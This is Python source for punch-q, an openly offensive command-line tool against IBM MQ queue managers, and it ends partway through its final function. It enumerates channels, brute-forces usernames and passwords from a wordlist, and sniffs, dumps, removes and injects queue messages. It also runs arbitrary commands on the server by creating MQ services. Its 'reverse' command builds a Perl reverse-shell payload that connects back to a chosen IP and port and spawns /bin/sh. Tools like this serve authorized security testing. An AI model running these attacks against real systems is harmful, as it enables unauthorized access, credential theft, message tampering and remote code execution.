import hashlib
import os
import string
import time
import uuid

import click
import yaml as yamllib

try:
    import pymqi

except ImportError as e:

    pymqi = None

    click.secho('Importing pymqi failed with: {0}!'.format(str(e)), fg='red')

    # If the LD_LIBRARY_PATH wasn't set, try and detect that and suggest a fix.
    if 'cannot open shared object file' in str(e):
        click.secho('\nTry to set the LD_LIBRARY_PATH with: export LD_LIBRARY_PATH=/opt/mqm/lib64\n', fg='red')
    else:
        click.secho('\nCheck out the following URL for some help: '
                    'https://github.com/dsuch/pymqi/issues/15#issuecomment-124772995\n', fg='red')

from libpunchq.__init__ import __version__
from libpunchq.conversion import channel_type_to_name, queue_type_to_name, \
    queue_usage_to_name
from libpunchq.mqstate import mqstate
from libpunchq.utils import get_table_handle, \
    is_ip_address, safe_filename, filename_from_attributes


@click.group()
@click.option('--config', '-C', type=click.Path(), help='Path to an optional configuration file.')
@click.option('--host', help='The IP address / hostname of the remote queue manager.')
@click.option('--port', type=click.INT, help='The port the remote queue manager is listening on. Eg: 1414')
@click.option('--qm_name', type=click.UNPROCESSED, help='The remote queue manager name.')
@click.option('--channel', type=click.UNPROCESSED, help='The channel to connect to. Eg: SYSTEM.ADMIN.SVRCONN')
@click.option('--username', '-U', type=click.UNPROCESSED, help='The username to use.')
@click.option('--password', '-P', type=click.UNPROCESSED, help='The the password to use.')
@click.option('--dump-config', is_flag=True, help='Dump the effective configuration used.')
@click.option('--table-width', '-w', type=click.INT, help='The maximum width used for table output', default=120)
def cli(config, host, port, qm_name, channel, username, password, dump_config, table_width):
    """
        \b
        punch-q for IBM MQ
            by @leonjza from @sensepost
    """

    # set the mq configuration based on the configuration file
    if config is not None:
        with open(config) as f:
            config_data = yamllib.load(f)
            mqstate.dictionary_updater(config_data)

    # set configuration based on the flags this command got
    mqstate.dictionary_updater(locals())

    # If we should be dumping configuration, do that.
    if dump_config:
        click.secho('Effective configuration for this run:', dim=True)
        click.secho('-------------------------------------', dim=True)
        click.secho('Host:                  {0}'.format(mqstate.host), dim=True)
        click.secho('Port:                  {0}'.format(mqstate.port), dim=True)
        click.secho('Queue Manager Name:    {0}'.format(mqstate.qm_name), dim=True)
        click.secho('Channel:               {0}'.format(mqstate.channel), dim=True)
        click.secho('Username:              {0}'.format(mqstate.username), dim=True)
        click.secho('Password:              {0}\n'.format(mqstate.password), dim=True)


@cli.command()
def version():
    """
        Prints the current punch-q version
    """

    click.secho('punch-q version {0}'.format(__version__))


@cli.command()
@click.option('--destination', '-d', default='config.yml', show_default=True,
              help='Destination filename to write the sample configuration file to.')
def yaml(destination):
    """
        Generate an example YAML configuration file to use
        with this tool.
    """

    # Don't be a douche and override an existing configuration
    if os.path.exists(destination):
        click.secho('The configuration file \'{0}\' already exists.'.format(destination), fg='yellow')
        if not click.confirm('Override?'):
            click.secho('Not writing a new sample configuration file')
            return

    config = {
        'host': '192.168.0.1',
        'port': 1414,
        'qm_name': 'QM1',
        'channel': 'SYSTEM.ADMIN.SVRCONN',
        'username': 'admin',
        'password': 'passw0rd',
    }

    click.secho('# An example YAML configuration for punch-q.\n', dim=True)
    click.secho(yamllib.dump(config, default_flow_style=False), bold=True)

    try:
        with open(destination, 'wb') as f:
            f.write('# A punch-q configuration file\n\n')
            f.write(yamllib.dump(config, default_flow_style=False))

        click.secho('Sample configuration file written to: {0}'.format(destination), fg='green')

    except Exception as ye:
        click.secho('Failed to write sample configuration file with error: {0}'.format(str(ye)), fg='red')


@cli.command()
def ping():
    """
        Ping a queue manager.
    """

    mqstate.validate(['host', 'port'])

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_PING_Q_MGR()
    click.secho('Queue manager command server is responsive.', fg='green')

    # Attempt to determine the MQ command level.
    mq_params = pcf.MQCMD_INQUIRE_Q_MGR({pymqi.CMQCFC.MQCMD_INQUIRE_SYSTEM: '*'})

    # Get the queue manager status
    mq_status = pcf.MQCMD_INQUIRE_Q_MGR_STATUS()[0]

    # A number of these are not in CMQC, so this comment is a reference:
    # MQCA_INSTALLATION_DESC: 2115
    # MQCA_INSTALLATION_NAME: 2116
    # MQCA_INSTALLATION_PATH: 2117
    # MQCACF_LOG_PATH: 3074
    # MQCACF_Q_MGR_START_DATE: 3175
    # MQCACF_Q_MGR_START_TIME: 3176

    click.secho('Queue Manager Status:', bold=True)
    click.secho('---------------------', bold=True)
    click.secho('Command Level:             {0}'.format(mq_params[0][pymqi.CMQC.MQIA_COMMAND_LEVEL]), bold=True)
    click.secho('Queue Manager Name:        {0}'.format(mq_status.get(pymqi.CMQC.MQCA_Q_MGR_NAME, '(unknown)')),
                bold=True)
    click.secho('Installation Name:         {0}'.format(mq_status.get(2116, '(unknown)')), bold=True)
    click.secho('Installation Path:         {0}'.format(mq_status.get(2117, '(unknown)')), bold=True)
    click.secho('Installation Description:  {0}'.format(mq_status.get(2115, '(unknown)')), bold=True)
    click.secho('Log Path:                  {0}'.format(mq_status.get(3074, '(unknown)')), bold=True)
    click.secho('Queue Manager Start Time:  {0}'.format(' '.join([
        mq_status.get(3175, '').strip(), mq_status.get(3176, '').strip()])), bold=True)
    click.secho('\n')

    click.secho('Successfully queried queue manager status.', fg='green')

    qmgr.disconnect()


@cli.group()
def discover():
    """
        Discover MQ information.
    """

    pass


@discover.command()
@click.option('--wordlist', '-w', type=click.Path(), help='A list of newline separated channel names.')
def channels(wordlist):
    """
        Discover channels.

        This command attempts to enumerate MQ channels using the provided
        configuration options. A list of default channel names is used
        if no wordlist is provided. Extra permutations will be generated
        if the target host is not an IP address.

        A number of cases exist where a channel does in fact exist
        server-side, but is not picked up by this command. This could
        be primarily because of the channel type not being a Server-connection.
    """

    # Ensure we have at least a host and a port
    mqstate.validate(['host', 'port'])

    if not wordlist:
        wordlist = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'wordlists/', 'mq_channels.txt')

    with open(wordlist, 'r') as f:
        # Don't read empty lines and strip spaces
        wordlist = [x.strip() for x in f.readlines() if len(x.strip()) > 0]

    # Check if the host is an IP address. If it is not, generate
    # permutations based on the hostname to try as channel names.
    if not is_ip_address(mqstate.host):
        click.secho('Destination host does not appear to be an IP address. Generating more permutations...', dim=True)

        # use the first entry as a base channel name
        base_name = mqstate.host.split('.')[0].upper()

        wordlist.append(base_name)
        wordlist.append(base_name + '.CHANNEL')
        wordlist.append(base_name + '.CHL')
        wordlist.append(base_name + '.SVRCONN')
        wordlist.append(base_name + '.ADMIN.SVRCONN')
        wordlist.append(base_name + '.AUTO.SVRCONN')
        wordlist.append(base_name + '.DEF.SVRCONN')
        wordlist.append(base_name + '.ADMIN.CHANNEL')
        wordlist.append(base_name + '.DEV.CHANNEL')

        # uniqify the final list
        wordlist = list(set(wordlist))

    # Loop the wordlist, trying to connect to the target channel.
    # The username & password is taken from the configuration.
    #
    # The existence of a channel is determined based on the response
    # from the target queue manager. Luckily, MQ responds with a clear
    # message if the remote channel does not exist.
    for channel in wordlist:

        channel = channel.strip()

        try:

            qmgr = pymqi.connect(mqstate.qm_name, channel, mqstate.get_host(),
                                 mqstate.username, mqstate.password)

            pcf = pymqi.PCFExecute(qmgr)
            pcf.MQCMD_PING_Q_MGR()

            # If no exception is thrown, the channel exists *AND* we have access
            # with the supplied credentials (or lack thereof).
            click.secho('"{0}" exists and was authorised.'.format(channel), fg='green', bold=True)

            qmgr.disconnect()

        except pymqi.MQMIError as ce:

            # Unknown channel. This is ok, just move along.
            if ce.reason == pymqi.CMQC.MQRC_UNKNOWN_CHANNEL_NAME:
                continue

            # The channel could be a sender /receiver type.
            elif ce.reason == pymqi.CMQC.MQRC_CHANNEL_CONFIG_ERROR:
                continue

            # Previous disconnect was not successful. Not sure why this happens tbh.
            elif ce.reason == pymqi.CMQC.MQRC_ALREADY_CONNECTED:
                qmgr.disconnect()
                continue

            # Channel is unavailable
            elif ce.reason == pymqi.CMQC.MQRC_CHANNEL_NOT_AVAILABLE:
                click.secho('"{0}" might exist, but is not available.'.format(channel), bold=True, fg='yellow')
                continue

            # An unauthenticated message means the channel at least exists.
            elif ce.reason == pymqi.CMQC.MQRC_NOT_AUTHORIZED:
                click.secho('"{0}" might exist, but user was not authorised.'.format(channel), bold=True)
                continue

            # Maybe this is an SSL error
            elif ce.reason == pymqi.CMQC.MQRC_SSL_INITIALIZATION_ERROR:
                click.secho('"{0}" might exist, but wants SSL.'.format(channel), bold=True, fg='yellow')
                continue

            # Some other error condition occurred.
            raise ce


@discover.command()
@click.option('--channel', '-c', required=True, type=click.UNPROCESSED, help='The channel to try authentication to.')
def users(channel):
    """
        Discover users.

        This command attempts to brute force MQ users for a specific channel.
        The channel name itself is taken from this sub command, and not the
        global --channel flag used for configuration.
    """

    click.secho('Brute forcing users on channel: {0}'.format(channel))

    wordlist = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'wordlists/', 'mq_users.txt')

    with open(wordlist, 'r') as f:
        wordlist = f.readlines()

    # Iterate the word list we have
    for user in wordlist:

        username, password = user.strip().split(':')

        print(username + ':' + password)

        try:
            qmgr = pymqi.connect(mqstate.qm_name, channel, mqstate.get_host(), username, password)
            pcf = pymqi.PCFExecute(qmgr)
            pcf.MQCMD_PING_Q_MGR()

            click.secho('Combination "{0}:{1}" authenticated.'.format(username, password), fg='green', bold=True)

            qmgr.disconnect()

        except pymqi.MQMIError as ce:

            # unknown channel
            if ce.reason == pymqi.CMQC.MQRC_NOT_AUTHORIZED:
                continue

            # Some other error condition.
            raise ce


@cli.group()
def show():
    """
        Show information.
    """

    pass


@show.command()
@click.option('--prefix', '-p', default='SYSTEM.*', show_default=True,
              help='A queue prefix filter to apply.')
@click.option('--min-depth', '-d', default=0, show_default=True,
              help='Only show queues with at least this number of messages.')
def queues(prefix, min_depth):
    """
        Show queues.
    """

    mqstate.validate(['host', 'port', 'channel'])

    args = {
        pymqi.CMQC.MQCA_Q_NAME: str(prefix),
        pymqi.CMQC.MQIA_Q_TYPE: pymqi.CMQC.MQQT_ALL
    }

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)
    pcf = pymqi.PCFExecute(qmgr)

    try:

        click.secho('Showing queues with prefix: \'{0}\'...\n'.format(prefix), dim=True)
        response = pcf.MQCMD_INQUIRE_Q(args)

    except pymqi.MQMIError as sqe:

        # no queues found
        if sqe.comp == pymqi.CMQC.MQCC_FAILED and sqe.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
            click.secho('No queues matched given prefix of {0}'.format(prefix), fg='red')

        else:
            raise sqe
    else:

        t = get_table_handle([
            'Created', 'Name', 'Type', 'Usage', 'Depth', 'Rmt. QMGR Name', 'Rmt. Queue Name', 'Description',
        ], markdown=True)
        t.set_style(t.STYLE_MARKDOWN)

        for queue_info in response:

            # skip queues that don't have at least the min amount of messages
            if queue_info.get(pymqi.CMQC.MQIA_CURRENT_Q_DEPTH, 0) < min_depth:
                continue

            t.append_row([
                ' '.join([
                    queue_info.get(pymqi.CMQC.MQCA_CREATION_DATE, '').strip(),
                    queue_info.get(pymqi.CMQC.MQCA_CREATION_TIME, '').strip()
                ]),
                queue_info.get(pymqi.CMQC.MQCA_Q_NAME, '').strip(),
                queue_type_to_name(queue_info.get(pymqi.CMQC.MQIA_Q_TYPE)),
                queue_usage_to_name(queue_info.get(pymqi.CMQC.MQIA_USAGE)),
                queue_info.get(pymqi.CMQC.MQIA_CURRENT_Q_DEPTH, ''),
                queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_MGR_NAME, '').strip(),
                queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_NAME, '').strip(),
                queue_info.get(pymqi.CMQC.MQCA_Q_DESC, '').strip(),
            ])
        click.secho(t.get_string())

    qmgr.disconnect()


@show.command()
@click.option('--prefix', '-p', default='SYSTEM.*', show_default=True,
              help='A channel prefix filter to apply.')
def channels(prefix):
    """
        Show channels.
    """

    mqstate.validate(['host', 'port', 'channel'])

    args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: str(prefix)}
    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)
    pcf = pymqi.PCFExecute(qmgr)

    try:

        click.secho('Showing channels with prefix: \'{0}\'...\n'.format(prefix), dim=True)
        response = pcf.MQCMD_INQUIRE_CHANNEL(args)

    except pymqi.MQMIError as sce:

        if sce.comp == pymqi.CMQC.MQCC_FAILED and sce.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
            click.secho('No channels matched prefix [%s]'.format(prefix), fg='red')

        else:
            raise sce

    else:

        t = get_table_handle([
            'Name', 'Type', 'MCA UID', 'Conn Name', 'Xmit Queue', 'Description', 'SSL Cipher',
        ])

        for channel_info in response:
            t.append_row([
                channel_info.get(pymqi.CMQCFC.MQCACH_CHANNEL_NAME, '').strip(),
                channel_type_to_name(channel_info.get(pymqi.CMQCFC.MQIACH_CHANNEL_TYPE)),
                channel_info.get(pymqi.CMQCFC.MQCACH_MCA_USER_ID, ''),
                channel_info.get(pymqi.CMQCFC.MQCACH_CONNECTION_NAME, '').strip(),
                channel_info.get(pymqi.CMQCFC.MQCACH_XMIT_Q_NAME, '').strip(),
                channel_info.get(pymqi.CMQCFC.MQCACH_DESC, '').strip(),
                # channel_info.get(pymqi.CMQCFC.MQCACH_PASSWORD, '(unknown)').strip(),
                channel_info.get(pymqi.CMQCFC.MQCACH_SSL_CIPHER_SPEC, '').strip(),
                # channel_info.get(pymqi.CMQCFC.MQCACH_SSL_PEER_NAME, '').strip(),
            ])
        click.secho(t.get_string())

    qmgr.disconnect()


@cli.group()
def messages():
    """
        Work with MQ messages.
    """

    pass


@messages.command()
@click.option('--queue', '-q', default='SYSTEM.ADMIN.COMMAND.QUEUE', show_default=True,
              help='The queue to dump messages from.')
@click.option('--limit', '-l', default=500, show_default=True, help='Maximum number of messages to dump.')
def dump(queue, limit):
    """
        Dump messages from a queue, non-destructively.
    """

    click.secho('Dumping a maximum of {0} messages from {1}...'.format(limit, queue), dim=True)

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    # https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.ref.dev.doc/q096780_.htm
    # https://github.com/dsuch/pymqi/blob/master/code/examples/put_get_correl_id.py
    gmo = pymqi.GMO()
    gmo.Options = pymqi.CMQC.MQGMO_BROWSE_NEXT
    queue = pymqi.Queue(qmgr, str(queue), pymqi.CMQC.MQOO_BROWSE)

    message_count = 0

    while message_count < limit:

        try:

            request_md = pymqi.MD()
            message = queue.get(None, request_md, gmo)

            # check if we have a MQSTR message.
            if request_md.Format.strip() not in ['MQSTR', '']:
                # remove non-printables and update the Format
                # column with (stripped) so that it is visible
                message = filter(lambda x: x in string.printable if x not in ['\n', '\t', '\r', '\r\n'] else '',
                                 message)
                request_md.Format = request_md.Format.strip() + ' (stripped)'

            table = get_table_handle(['Date', 'Time', 'MsgID', 'MsgType', 'Expiry', 'User', 'Format', 'App Name'],
                                     markdown=False)
            table.append_row([
                request_md.PutDate,
                request_md.PutTime,
                filter(lambda x: x in string.printable, request_md.MsgId),  # f* up non-printables.
                request_md.MsgType,
                request_md.Expiry,
                request_md.UserIdentifier.strip(),
                request_md.Format.strip(),
                request_md.PutApplName.strip(),
            ])

            # Print a 'header' for the message
            click.secho(table.get_string())

            # Print the message itself
            click.secho('\n' + '*' * 40 + ' BEGIN MESSAGE DATA ' + '*' * 40, dim=True)
            click.secho(message.strip())
            click.secho('*' * 41 + ' END MESSAGE DATA ' + '*' * 41 + '\n', dim=True)

        except pymqi.MQMIError as dme:

            if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                click.secho('Dump complete. No more messages on the queue.', fg='yellow')

                break

            else:
                raise dme

        message_count += 1

    click.secho('')
    click.secho('\nGot {0} message(s) in total.'.format(message_count), dim=True)

    queue.close()
    qmgr.disconnect()


@messages.command()
@click.option('--queue', '-q', default='SYSTEM.ADMIN.COMMAND.QUEUE', show_default=True,
              help='The queue to read messages from.')
@click.option('--store', is_flag=True, help='Save messages as to disk as they arrive.')
@click.option('--directory', '-d', type=click.STRING,
              help='The directory to save messages to. If this directory does not exist it will be '
                   'created.')
def sniff(queue, store, directory):
    """
        Sniff messages on a queue, non-destructively.

        Sniffs queues messages on a queue by opening the
        queue in a read only mode. Incoming messages will
        be dumped to the screen by default. If the --store
        flag is specified, messages will also be written
        to disk as they arrive.
    """

    mqstate.validate(['host', 'port'])

    # Prepare the destination directory if messages should also be saved
    if store:
        # Automatically generate a directory to save messages to
        if not directory:
            directory = safe_filename(mqstate.host + '_' + safe_filename(queue))
            click.secho('Messages will be saved to directory \'{0}\''.format(directory), dim=True, fg='green')

        # check that the directory is ready for use
        absolute_path = os.path.abspath(directory)
        if not os.path.exists(absolute_path):
            click.secho('Creating {0} to save messages in...'.format(absolute_path), dim=True)
            os.makedirs(absolute_path, mode=0o755)

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    # https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.ref.dev.doc/q096780_.htm
    # https://github.com/dsuch/pymqi/blob/master/code/examples/put_get_correl_id.py
    # https://github.com/dsuch/pymqi/blob/master/code/examples/get_wait_multiple_messages.py
    gmo = pymqi.GMO()
    gmo.Options = pymqi.CMQC.MQGMO_BROWSE_NEXT | pymqi.CMQC.MQGMO_WAIT | pymqi.CMQC.MQGMO_FAIL_IF_QUIESCING
    gmo.WaitInterval = 2 * 1000  # 5 seconds

    queue = pymqi.Queue(qmgr, str(queue), pymqi.CMQC.MQOO_BROWSE)

    request_md = pymqi.MD()

    # simple counter for statistics
    message_count = 0
    click.secho('Waiting for messages to arrive...', dim=True)

    while True:

        try:

            # grab the message
            message = queue.get(None, request_md, gmo)
            message_count += 1

            # Save the message if we need to we do this early as
            # messages could be reformatted to be printed to screen.
            if store:
                file_name = filename_from_attributes(
                    request_md.PutDate,
                    request_md.PutTime,
                    request_md.MsgType,
                    '.' + hashlib.sha1(request_md.MsgId).hexdigest() + '.',
                    request_md.Expiry,
                    request_md.UserIdentifier.strip(),
                    request_md.Format.strip(),
                    request_md.PutApplName.strip())

                with open(os.path.join(absolute_path, file_name), 'wb') as f:
                    f.write(message)

                click.secho('{0}: Wrote message to {1}'.format(message_count, file_name), bold=True, fg='green')

            # check if we have a MQSTR message. If we don't, try and filter
            # non-printables.
            if request_md.Format.strip() not in ['MQSTR', '']:
                # remove non-printables and update the Format
                # column with (stripped) so that it is visible
                message = filter(lambda x: x in string.printable if x not in ['\n', '\t', '\r', '\r\n'] else '',
                                 message)
                request_md.Format = request_md.Format.strip() + ' (stripped)'

            click.secho('Message #{0}'.format(message_count), bold=True)

            table = get_table_handle(['Date', 'Time', 'MsgID', 'MsgType', 'Expiry', 'User', 'Format', 'App Name'],
                                     markdown=False)
            table.append_row([
                request_md.PutDate,
                request_md.PutTime,
                filter(lambda x: x in string.printable, request_md.MsgId),  # f* non-printables.
                request_md.MsgType,
                request_md.Expiry,
                request_md.UserIdentifier.strip(),
                request_md.Format.strip(),
                request_md.PutApplName.strip(),
            ])

            # Print a 'header' for the message
            click.secho(table.get_string())

            # Print the message itself
            click.secho('' + '*' * 40 + ' BEGIN MESSAGE DATA ' + '*' * 40, dim=True)
            click.secho(message.strip())
            click.secho('*' * 41 + ' END MESSAGE DATA ' + '*' * 41 + '\n', dim=True)

            # reset the descriptor so we can reuse it.
            request_md.MsgId = pymqi.CMQC.MQMI_NONE
            request_md.CorrelId = pymqi.CMQC.MQCI_NONE
            request_md.GroupId = pymqi.CMQC.MQGI_NONE

        except pymqi.MQMIError as dme:

            # No messages, that's OK, we can ignore it.
            if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                pass
            else:
                # Some other error condition.
                raise dme

        except KeyboardInterrupt as _:
            click.secho('Stopping...', fg='yellow')
            break

    click.secho('\nSniffed {0} message(s) in total.'.format(message_count), dim=True)

    queue.close()
    qmgr.disconnect()


@messages.command()
@click.option('--queue', '-q', default='SYSTEM.ADMIN.COMMAND.QUEUE', show_default=True,
              help='The queue to dump messages from.')
@click.option('--limit', '-l', default=500, show_default=True, help='Maximum number of messages to dump.')
@click.option('--directory', '-d', type=click.STRING,
              help='The directory to save messages to. If this directory does not exist it will be '
                   'created. Defaults to a queue manager and queue name combination')
def save(queue, limit, directory):
    """
        Save messages from a queue to a file, non-destructively.
    """

    mqstate.validate(['host', 'port', 'channel'])

    # Automatically generate a directory to save messages to
    if not directory:
        directory = safe_filename(mqstate.host + '_' + safe_filename(queue))
        click.secho('Saving messages to \'{0}\'...'.format(directory), dim=True, fg='green')

    # check that the directory is ready for use
    absolute_path = os.path.abspath(directory)
    if not os.path.exists(absolute_path):
        click.secho('Creating {0} to save messages in...'.format(absolute_path), dim=True)
        os.makedirs(absolute_path, mode=0o755)

    click.secho('Saving a maximum of {0} messages from {1}...'.format(limit, queue), dim=True)

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    # https://www.ibm.com/support/knowledgecenter/en/SSFKSJ_7.5.0/com.ibm.mq.ref.dev.doc/q096780_.htm
    # https://github.com/dsuch/pymqi/blob/master/code/examples/put_get_correl_id.py
    gmo = pymqi.GMO()
    gmo.Options = pymqi.CMQC.MQGMO_BROWSE_NEXT
    queue = pymqi.Queue(qmgr, str(queue), pymqi.CMQC.MQOO_BROWSE)

    message_count = 0

    while message_count < limit:
        try:

            request_md = pymqi.MD()
            message = queue.get(None, request_md, gmo)

            file_name = filename_from_attributes(
                request_md.PutDate,
                request_md.PutTime,
                request_md.MsgType,
                '.' + hashlib.sha1(request_md.MsgId).hexdigest() + '.',
                request_md.Expiry,
                request_md.UserIdentifier.strip(),
                request_md.Format.strip(),
                request_md.PutApplName.strip())

            with open(os.path.join(absolute_path, file_name), 'wb') as f:
                f.write(message)

            click.secho('{0}: Wrote message to {1}'.format(message_count, file_name), bold=True, fg='green')

        except pymqi.MQMIError as dme:

            if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                click.secho('Dump complete. No more messages on the queue.', fg='yellow')

                break

            else:
                raise dme

        message_count += 1

    click.secho('Saved {0} message(s) in total.'.format(message_count), bold=True)

    queue.close()
    qmgr.disconnect()


@messages.command()
@click.option('--queue', '-q', required=True, help='The queue to dump messages from.')
@click.option('--save-to', '-s', type=click.File('wb'), help='A filename to save the message to.')
@click.option('--skip-confirmation', '-k', is_flag=True, help='Skip the confirmation prompt.')
def pop(queue, save_to, skip_confirmation):
    """
        Pop a message off the queue.
    """

    if not skip_confirmation:
        if not click.confirm('Are you sure you want to pop a message off the queue? This action will '
                             'REMOVE the message from the selected queue!'):
            click.secho('Did not receive confirmation, bailing...')
            return

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    try:

        queue = pymqi.Queue(qmgr, str(queue))
        request_md = pymqi.MD()
        message = queue.get(None, request_md)

    except pymqi.MQMIError as dme:

        if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
            click.secho('No messages to pop from the queue.', fg='yellow')
            return

        else:
            raise dme

    t = get_table_handle(['Date', 'Time', 'User', 'Format', 'App Name', 'Data'], markdown=False)
    t.append_row([
        request_md.PutDate, request_md.PutTime,
        request_md.UserIdentifier.strip(),
        request_md.Format.strip(),
        request_md.PutApplName.strip(),
        message
    ])

    click.secho('')
    click.secho(t.get_string())

    # save to file if we got a file argument
    if save_to:
        save_to.write(message)
        click.secho('\nSaved message data to file: {0}'.format(save_to.name), fg='green')

    queue.close()
    qmgr.disconnect()


@messages.command()
@click.option('--queue', '-q', required=True, help='The queue to dump messages from.')
@click.option('--source-file', '-f', type=click.File('rb'), help='A filename containing message data.')
@click.option('--source-string', '-s', type=click.STRING, help='A string to use as message data.')
def push(queue, source_file, source_string):
    """
        Push a message onto the queue.
    """

    if source_file is None and source_string is None:
        click.secho('Please provide either a source file or a source string.', fg='red')
        return

    if source_file and source_string:
        click.secho('Both a source file and string was specified. Only one is allowed.', fg='red')
        return

    if source_file:
        message = source_file.read()
    else:
        message = source_string

    click.secho('Pushing message onto queue: {0}'.format(queue), dim=True)
    click.secho('Message (truncated): {0}'.format(message[:150]), dim=True)

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    try:

        put_mqmd = pymqi.MD()
        put_mqmd.Format = pymqi.CMQC.MQFMT_STRING

        # https://github.com/dsuch/pymqi/blob/master/code/examples/put_get_correl_id.py#L69-L71
        put_opts = pymqi.PMO(Options=pymqi.CMQC.MQPMO_NO_SYNCPOINT + pymqi.CMQC.MQPMO_FAIL_IF_QUIESCING)

        mqqueue = pymqi.Queue(qmgr, str(queue))
        mqqueue.put(message, put_mqmd, put_opts)

    except pymqi.MQMIError as dme:

        if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
            click.secho('No messages to pop from the queue.', fg='yellow')
            return

        else:
            raise dme

    mqqueue.close()
    qmgr.disconnect()

    click.secho('Message successfully pushed onto the queue.', fg='green')


@cli.group()
def command():
    """
        Execute commands via MQ Services.
    """

    pass


@command.command()
@click.option('--cmd', '-c', type=click.STRING, required=True, help='A base command to execute.')
@click.option('--args', '-a', type=click.STRING, help='Optional arguments for your command.')
@click.option('--service-name', '-n', type=click.UNPROCESSED, default=None, help='A service name to use.')
@click.option('--wait', '-w', default=5, show_default=True,
              help='Number of seconds to wait before cleaning up the service.')
def execute(cmd, args, service_name, wait):
    """
        Execute an arbitrary command.

        \b
        Examples:
            python punch-q.py command execute -c /bin/ping -a "-c 1 192.168.0.1"
            python punch-q.py -C pq.yml command execute --cmd "/bin/ping" --args "-c 5 192.168.0.8" --wait 8
    """

    # Generate a service name if none was provided
    if not service_name:
        service_name = uuid.uuid4()

    # Cleanup the service name to remove spaces and dashes and limit to 16 chars
    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]

    # Check if a full path was provided for the command to run.
    # Seems like the ENV does not have a PATH.
    if '/' not in cmd:
        click.secho('The command does not appear to be a full path to the executable. This command execution may '
                    'fail. Are you sure you want to continue?', fg='yellow')
        if not click.confirm('Continue?'):
            return

    # information
    click.secho('Cmd: {0}'.format(cmd), bold=True)
    click.secho('Arg: {0}'.format(args), bold=True)
    click.secho('Service Name: {0}\n'.format(service_name))

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    # create the service
    click.secho('Creating service...', dim=True)
    args = {
        pymqi.CMQC.MQCA_SERVICE_NAME: service_name,
        pymqi.CMQC.MQIA_SERVICE_CONTROL: pymqi.CMQC.MQSVC_CONTROL_MANUAL,
        pymqi.CMQC.MQIA_SERVICE_TYPE: pymqi.CMQC.MQSVC_TYPE_COMMAND,
        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: str(cmd),
        pymqi.CMQC.MQCA_SERVICE_START_ARGS: str(args)
    }
    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_CREATE_SERVICE(args)

    # start the service
    click.secho('Starting service...', fg='green')
    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}

    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_START_SERVICE(args)

    click.secho('Giving the service {0} second(s) to live...'.format(wait), dim=True)
    time.sleep(wait)

    # delete service
    click.secho('Cleaning up service...', dim=True)
    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}

    pcf = pymqi.PCFExecute(qmgr)
    pcf.MQCMD_DELETE_SERVICE(args)

    qmgr.disconnect()

    click.secho('Done', fg='green')


@command.command()
@click.option('--ip', '-i', type=click.STRING, required=True, help='The IP address to connect back to.')
@click.option('--port', '-p', type=click.INT, required=True, help='The port for the connection back.')
@click.option('--service-name', '-n', type=click.UNPROCESSED, default=None, help='A service name to use.')
@click.option('--wait', '-w', default=5, show_default=True,
              help='Number of seconds to wait before cleaning up the service.')
def reverse(ip, port, service_name, wait):
    """
        Start a Perl-based reverse shell.

        \b
        Examples:
            python punch-q.py -C pq.yml command reverse --ip 192.168.5.1 --port 4444
    """

    # Generate a service name if none was provided
    if not service_name:
        service_name = uuid.uuid4()

    # Cleanup the service name to remove spaces and dashes and limit to 16 chars
    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]

    # raw perl, passed as part of a -e argument
    payload = "use Socket;$i='" + str(ip) + "';$p=" + str(port) + \
              ";socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));" \
              "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');" \
              "open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"

    # information
    click.secho('Ip: {0}'.format(ip), bold=True)
    click.secho('Port: {0}'.format(port), bold=True)
    click.secho('Raw Perl: {0}'.format(payload), bold=True, fg='blue')
    click.secho('Service Name: {0}\n'.format(service_name))

    qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                         mqstate.username, mqstate.password)

    # create the service
    click.secho('Creating service...', dim=True)
    args = {
        pymqi.CMQC.MQCA_SERVICE_NAME: service_name,
